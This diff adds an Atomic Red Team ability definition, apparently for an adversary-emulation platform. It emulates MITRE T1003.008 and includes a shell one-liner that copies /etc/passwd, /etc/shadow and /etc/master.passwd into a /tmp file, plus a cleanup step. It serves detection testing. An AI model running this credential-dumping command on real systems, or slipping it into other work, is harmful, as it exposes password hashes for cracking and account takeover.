@@ -1,0 +1,34 @@
+- id: f5aa6543-6cb2-4fae-b9c2-b96e14721713
+  name: Access /etc/{shadow,passwd,master.passwd} with shell builtins
+  description: Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: 'OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow'
+  platforms:
+    linux:
+      sh:
+        command: testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt;
+          done < $1) }; [ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd;
+          testcat /etc/passwd; testcat /etc/shadow
+        cleanup: 'rm -f #{output_file}'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1003.008
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      output_file:
+        description: Path where captured results will be placed
+        type: path
+        default: /tmp/T1003.008.txt
+    technique_created: '2020-02-11T18:46:56.263Z'
+    atomic_guid: f5aa6543-6cb2-4fae-b9c2-b96e14721713
+    import_timestamp: '2025-06-24T11:15:56.535214Z'
